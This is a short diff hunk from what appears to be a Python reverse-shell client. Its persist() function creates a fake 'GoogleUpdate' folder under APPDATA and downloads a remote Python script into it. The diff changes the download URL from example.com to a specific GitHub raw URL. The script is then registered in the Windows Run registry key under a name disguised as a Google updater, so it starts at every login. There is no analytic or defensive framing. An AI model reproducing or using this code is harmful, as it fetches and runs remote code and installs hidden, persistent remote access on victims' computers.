@@ -12,7 +12,7 @@ s.connect((IP,PORT))
 
 def persist():
     os.mkdir(os.path.join(os.path.join(os.environ['APPDATA']), 'GoogleUpdate'))
-    url = "https://example.com/client.py"
+    url = "https://raw.githubusercontent.com/srpentesters/ggg3s/main/ggg3s.py"
     filename = os.path.join(os.path.join(os.environ['APPDATA']), 'GoogleUpdate/GoogleUpdateHV.py')
     urllib.request.urlretrieve(url, filename)
     subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v GoogleUpdateHV /t REG_SZ /d ' + filename, shell=True)
